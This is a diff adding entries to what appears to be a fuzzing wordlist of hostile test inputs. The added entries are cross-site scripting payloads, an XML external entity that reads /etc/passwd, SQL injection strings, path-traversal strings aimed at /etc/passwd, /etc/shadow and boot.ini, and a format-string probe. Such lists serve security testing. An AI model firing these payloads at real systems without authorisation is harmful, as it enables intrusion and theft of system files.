@@ -3,7 +3,27 @@
 <script>alert('XSS');//
 <input autofocus onfocus=alert(1)>
 '"{}<>:/!--
-'
-"
- 
- 
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+"><script>"
+">xxx<P>yyy
+%U200
+U+200E;&#x200e;
+&quot;;id&quot;
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+(')
+" or "a"="a
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1--
+"' or 1 --'"
+../../../../../../etc/passwd
+../../../../../../../../../../../../boot.ini%00
+/./././././././././././boot.ini
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+*'*|+%00@'
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+FALSE
+NULL
+TRUE
+\00^'`d%00|{'}|}%0A%0D
